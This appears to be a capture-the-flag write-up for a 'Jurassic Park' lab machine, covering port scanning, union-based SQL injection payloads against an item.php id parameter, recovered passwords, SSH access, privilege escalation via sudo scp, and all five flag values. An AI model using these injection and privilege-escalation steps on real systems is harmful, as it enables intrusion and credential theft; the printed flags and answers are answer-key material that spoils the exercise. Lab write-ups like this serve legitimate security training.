# Jurassic Park

"This medium-hard task will require you to enumerate the web application, get credentials to the server and find 5 flags hidden around the file system. Oh, Dennis Nedry has helped us to secure the app too...

You're also going to want to turn up your devices volume (firefox is recommended). So, deploy the VM and get hacking..."

## Recon

Initial `nmap -p-` revealed:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 02:54 UTC
Nmap scan report for ip-10-10-23-246.eu-west-1.compute.internal (10.10.23.246)
Host is up (0.00065s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:C7:70:B4:4A:54 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.83 seconds
```

nikto and dirb against the website revealed a delete page, whose contents was the following:

```
New priv esc for Ubunut??

Change MySQL password on main system!
```

The assets dir was also listable. It contained images and a few audio files, none of which seemed to contain anything of note.

Clicking through the website to `shop.php` there were three packages you could buy. Clicking through on any of them took me to `item.php` with a query param `id` of 1, 2 or 3. The id seemed injectable; some entries, like `id=*` would return a mysql error. Others, like `id='`, would trigger a denied error page with a jurassic park themed error.

sqlmap didnt work - kept timing out (later when I examined the source of the page, there seems to be some anti-sqlmap code in there).

I tried incrementing id, and on id 5 I got a 'development product' with the description:

```
Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?
```

## SQLi

Trying the query `1 union select null, password, null, null, null from users` results in the password `ih8dinos` being printed on screen. I had confirmed the five column select and positioning already through trial and error.

Select into outfile didn't work (--secure-file-priv or whatever was not set). Select `user()` revealed mysql was running as root@localhost. Trying to ssh onto the box with root and `ih8dinos` did not get me access unfortunately.

I discovered the sql inject would only return the last row from its query as a result. Therefore, ih8dinos from above was the password of the final row in the users table. Appending `limit 2` got a second and as far as I could see, the only other password: `D0nt3ATM3`. This also didn't work with ssh.

However, focusing on the room questions:

1. To get the database name, I used: `1 union select distinct null, table_schema, null, null, null from information_schema.tables limit 4` and revealed `park`

2. I used `1 union select null, table_name, null, null, null from information_schema.tables where table_schema = "park" limit 2` to discover just two tables, `items` and `users`. I already know from my injection that `items` has `5` columns

3. `1 union select null, version(), null, null, null` reveals `5.7.25-0ubuntu0.16.04.2`. Going by the answer mask, the answer is `ubuntu 16.04`.

4. Dennis' password could be one of the two I have found so far. `ih8dinos` was the answer.

At this point I tried ssh'ing as `dennis` to the machine, and the password worked, getting me a shell as dennis.

## Flags

**flag1.txt** was in dennis's home dir: `b89f2d69c56b9981ac92dd267f`

I ran `sudo -l` immediately, and discovered:

```
Matching Defaults entries for dennis on ip-10-10-23-246.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-23-246.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
```

dennis had a test.sh file saying **flag5.txt** was under /root. I used `sudo scp /root/flag5.txt .` to get flag5 where I could read it: `2a7074e491fcacc7eeba97808dc5e2ec`

`find / -name flag* 2>/dev/null` revealed **flag2** at `/boot/grub/fonts/flagTwo.txt`: `96ccd6b429be8c9a4b501c7a0b117b0a`

**flag3** was the top entry of dennis' `.bash_history file`: `b4973bbc9053807856ec815db25fb3f1`

The final flag (for me) was **flag 4**. The file `.viminfo` in dennis' dir said it should be `/tmp/flagFour.txt`. I looked around but the flag was nowhere to be seen. Even root searches (see next note) didn't reveal it. I finally looked for help and discovered this is a bug - the flag is supposed to be there in `tmp`, but isn't. So, using a walkthrough (where the writer said he got it direct from the creator), I 'OSINTed' the flag as `f5339ad0edbd0b0fe1262d91a475c2c4`

At this point, I used https://gtfobins.github.io/gtfobins/scp/#sudo to get a root shell using scp, then changed the root password to `hacktheplanet` for good measure. This wasn't really necessary, but fuckit.
